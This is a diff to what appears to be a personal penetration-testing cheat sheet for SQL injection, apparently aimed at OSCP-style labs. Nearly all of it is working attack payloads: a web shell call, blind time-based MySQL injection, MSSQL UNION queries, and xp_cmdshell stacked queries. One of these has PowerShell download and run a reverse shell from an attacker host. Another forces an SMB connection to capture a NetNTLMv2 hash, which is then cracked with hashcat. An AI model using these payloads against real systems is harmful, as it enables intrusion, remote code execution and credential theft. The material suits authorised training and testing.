@@ -57,6 +57,7 @@ curl -sk "<Scheme>://<WebHost>/shell.php?cmd=id"
 1' AND IF(ASCII(SUBSTRING(database(),1,1))>109,SLEEP(5),0)-- -
 - [ ] Every delay seen twice before I trust it: the network fakes them
 - [ ] More than a few characters: sqlmap, :Pb sqlmap, where it is allowed
+- [ ] Not on the OSCP exam: OffSec bans SQLmap; keep extracting characters by hand here
 
 ## MSSQL
 -1 UNION SELECT NULL,@@version,NULL-- -
@@ -73,8 +74,8 @@ Stacked queries as sysadmin, with sudo tcpdump -i tun0 icmp running on Kali:
 '; EXEC xp_cmdshell 'ping -n 2 <LHOST>';-- -
 '; EXEC xp_cmdshell 'powershell -c "iex (iwr -UseBasicParsing http://<LHOST>/rev.ps1)"';-- -
 - [ ] rev.ps1 is a reverse shell from :Pb shells, served from Kali on port 80
-Not sysadmin: the service account's NetNTLMv2 hash, with Responder listening.
-sudo responder -I tun0
+Not sysadmin: the service account's NetNTLMv2 hash, with the non-poisoning SMB listener from :Pb responder.
+sudo /opt/pwn-broker/bin/impacket-smbserver share . -smb2support
 '; EXEC master..xp_dirtree '\\<LHOST>\share';-- -
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
